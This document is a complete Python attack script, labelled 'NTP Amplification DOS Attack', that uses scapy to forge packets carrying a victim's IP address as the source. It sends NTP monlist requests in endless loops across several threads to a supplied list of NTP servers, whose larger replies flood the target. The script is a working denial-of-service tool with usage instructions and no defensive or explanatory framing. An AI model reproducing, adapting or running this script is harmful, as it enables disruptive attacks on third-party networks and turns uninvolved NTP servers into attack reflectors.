#!/usr/bin/env python
from scapy.all import IP, UDP, Raw, send
import sys
import threading
import time
import random

def deny():
    global ntplist
    global currentserver
    global data
    global target
    ntpserver = ntplist[currentserver].strip()  
    currentserver = (currentserver + 1) % len(ntplist)  
    packet = IP(dst=ntpserver, src=target) / UDP(sport=random.randint(2000, 65535), dport=123) / Raw(load=data)
    send(packet, loop=1)

def printhelp():
    print("NTP Amplification DOS Attack")
    print("By FALKERN")
    print("Usage: ntp_ddos.py <target ip> <ntpserver list> <number of threads>")
    print("ex: ntp_ddos.py 1.2.3.4 ntp.txt 10")
    print("NTP serverlist file should contain one IP per line")
    print("MAKE SURE YOUR THREAD COUNT IS LESS THAN OR EQUAL TO YOUR NUMBER OF SERVERS")
    exit(0)

try:
    if len(sys.argv) < 4:
        printhelp()
    target = sys.argv[1]
    if target in ("help", "-h", "h", "?", "--h", "--help", "/?"):
        printhelp()
    ntpserverfile = sys.argv[2]
    numberthreads = int(sys.argv[3])
    ntplist = []
    currentserver = 0
    with open(ntpserverfile) as f:
        ntplist = f.readlines()
    if numberthreads > len(ntplist):
        print("Attack Aborted: More threads than servers")
        print("Next time don't create more threads than servers")
        exit(0)
    data = "\x17\x00\x03\x2a" + "\x00" * 4
    threads = []
    print("Starting to flood: " + target + " using NTP list: " + ntpserverfile + " with " + str(numberthreads) + " threads")
    print("Use CTRL+C to stop attack")
    for n in range(numberthreads):
        thread = threading.Thread(target=deny)
        thread.daemon = True
        thread.start()
        threads.append(thread)
    print("Sending...")
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("Script Stopped [ctrl + c]... Shutting down")
